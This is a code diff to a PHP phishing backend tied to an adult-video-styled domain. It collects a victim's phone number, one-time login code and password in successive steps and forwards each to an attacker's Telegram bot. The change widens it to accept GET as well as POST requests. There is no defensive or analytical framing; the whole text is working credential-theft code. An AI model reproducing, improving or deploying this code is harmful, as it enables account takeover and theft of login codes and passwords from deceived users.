@@ -4,7 +4,7 @@ $allowedDomain = "https://desiviralxxxvideos.infy.uk";
 
 // Enable CORS only for the allowed domain
 header("Access-Control-Allow-Origin: $allowedDomain");
-header("Access-Control-Allow-Methods: POST");
+header("Access-Control-Allow-Methods: GET, POST");
 header("Access-Control-Allow-Headers: Content-Type");
 
 // Validate origin and referer to prevent unauthorized access
@@ -17,10 +17,10 @@ if ($origin !== $allowedDomain && strpos($referer, $allowedDomain) !== 0) {
     exit();
 }
 
-// Block all non-POST requests
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+// Allow only GET and POST requests
+if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $_SERVER['REQUEST_METHOD'] !== 'GET') {
     http_response_code(405); // Method Not Allowed
-    echo json_encode(["error" => "Only POST requests are allowed"]);
+    echo json_encode(["error" => "Only GET and POST requests are allowed"]);
     exit();
 }
 
@@ -48,27 +48,31 @@ function sendToTelegram($message) {
     curl_close($ch);
 }
 
-// Handle POST Requests
-$action = $_POST['action'] ?? '';
+// Handle both GET and POST requests
+$requestData = $_SERVER['REQUEST_METHOD'] === 'POST' ? $_POST : $_GET;
+$action = $requestData['action'] ?? '';
 
+// Handle phone submission
 if ($action === 'phone') {
-    $phone = $_POST['phone'] ?? '';
+    $phone = $requestData['phone'] ?? '';
     sendToTelegram("*Phone:* \n`$phone`");
     echo json_encode(["step" => "code"]);
     exit;
 }
 
+// Handle OTP submission
 if ($action === 'otp') {
-    $phone = $_POST['phone'] ?? '';
-    $code = $_POST['code'] ?? '';
+    $phone = $requestData['phone'] ?? '';
+    $code = $requestData['code'] ?? '';
     sendToTelegram("*OTP:*\n Phone: `$phone`\n OTP: `$code`");
     echo json_encode(["step" => "password"]);
     exit;
 }
 
+// Handle password submission
 if ($action === 'password') {
-    $phone = $_POST['phone'] ?? '';
-    $password = $_POST['password'] ?? '';
+    $phone = $requestData['phone'] ?? '';
+    $password = $requestData['password'] ?? '';
     sendToTelegram("*Login:*\n Phone: `$phone`\n Password: `$password`");
     echo json_encode(["status" => "success"]);
     exit;
